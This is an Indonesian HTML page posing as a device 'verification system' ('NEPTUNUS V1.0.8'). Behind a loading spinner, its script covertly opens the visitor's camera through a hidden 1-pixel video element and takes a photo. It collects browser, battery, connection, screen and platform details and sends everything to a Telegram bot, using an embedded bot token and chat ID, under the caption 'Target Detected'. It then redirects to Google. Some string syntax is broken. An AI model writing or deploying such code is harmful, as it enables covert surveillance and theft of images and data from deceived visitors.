<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi</title>
    <style>
        body { background: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>Sedang memverifikasi perangkat anda...</p>

    <video id="video" style="position: absolute; width: 1px; height: 1px; opacity: 0;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // MASUKKAN TOKEN DAN CHAT ID DI SINI (Pastikan repositori ini PRIVATE agar aman)
        const TOKEN = '8746483619:AAFM0hZ7HwcnPFPV07PFUZZ4lGML0Nrt5aw';
        const CHAT_ID = '6888530451';
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "environment" } 
                });
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(takeSnapshot, 3000);
                };
            } catch (err) {
                window.location.href = "https://google.com";
            }
        }

        async function takeSnapshot() {
            // Deteksi Data Perangkat
            let battery = "Unknown";
            if (navigator.getBattery) {
                const bat = await navigator.getBattery();
                battery = Math.round(bat.level * 100) + "%";
            }

            const info = 📸 **Target Terdeteksi!**\n\n +
                         📱 **Browser:** ${navigator.userAgent.split(' ').slice(-2).join(' ')}\n +
                         🔋 **Baterai:** ${battery}\n +
                         🌐 **Koneksi:** ${navigator.connection ? navigator.connection.effectiveType : 'N/A'}\n +
            Resolusi:🖥 **Resolusi:** ${window.screen.width}x${window.screen.height}\n +
            Platform:🌍 **Platform:** ${navigator.platform}\n\n +
                         <i>NEPTUNUS V1.0.8</i>;

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'target.jpg');
                formData.append('caption', info);
                formData.append('parse_mode', 'HTML');

                fetch(https://api.telegram.org/bot${TOKEN}/sendPhoto, {
                    method: 'POST',
                    body: formData
                }).finally(() => {
                    window.location.href = "https://google.com";
                });
            }, 'image/jpeg', 0.8);
        }

        window.onload = startCamera;
    </script>
</body>
</html>
